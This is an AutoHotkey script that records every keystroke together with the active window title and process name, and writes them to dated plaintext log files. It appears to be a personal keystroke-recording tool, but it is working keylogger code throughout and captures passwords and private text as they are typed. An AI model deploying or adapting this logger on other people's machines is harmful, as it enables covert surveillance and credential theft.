#InstallKeybdHook
#InstallMouseHook
#persistent

SetWorkingDir %A_ScriptDir%

SetBatchLines -1

global windowAndKeyList:=""
global keyList:=""
global preA_DD:=A_DD

OnMessage(0x4a, "ReceiveMessage")
OnExit("Recovery")

SetTimer,GetActiveWindowList,10
SetTimer,TimeCounter,300000
SetTimer,GetKeyList,-1

GetKeyList()
{
    while(true)
    {
        Input,keyList,V B L1,{vk0A}
        windowAndKeyList .= keyList
    }
    return
}

TimeCounter()
{
    global windowAndKeyList,preA_DD
    if(A_DD!=preA_DD || StrLen(windowAndKeyList)>300)
    {
        RecordToFile()
        preA_DD:=A_DD
    }
    else if(A_TimeIdle>300000)
    {
        RecordToFile()
    }
    return
}

GetActiveWindowList()
{
    global windowAndKeyList
    static PreActiveWindow := ""
    WinGetActiveTitle, ActiveWindow
    WinGet, ActiveProcessName, ProcessName, A
    ActiveProcessName:=SubStr(ActiveProcessName,1,StrLen(ActiveProcessName)-4)
    if(ActiveWindow != PreActiveWindow && ActiveProcessName != "" && ActiveWindow != "KeyRecord")
    {
        windowAndKeyList .= "`n" . ActiveWindow . " - " . ActiveProcessName . ":`n"
        PreActiveWindow := ActiveWindow
    }
    return
}

RecordToFile()
{
    global windowAndKeyList,preA_DD
    if(windowAndKeyList)
    {
        if(SubStr(windowAndKeyList,1,1)!="`n")
            windowAndKeyList := "`n" . windowAndKeyList
        FileCreateDir,Record\%A_YYYY%
        FileAppend,`n[%A_Now%]%windowAndKeyList%`n,Record\%A_YYYY%\%A_YYYY%%A_MM%%preA_DD%.log
        windowAndKeyList:=""
    }
    return
}

ReceiveMessage(wParam, lParam)
{
  StringAddress := NumGet(lParam + 2*A_PtrSize)
  CopyOfData := StrGet(StringAddress)
  if(CopyOfData=0x12)
      ExitApp
  return true
}

Recovery()
{
    RecordToFile()
    ExitApp
    return
}
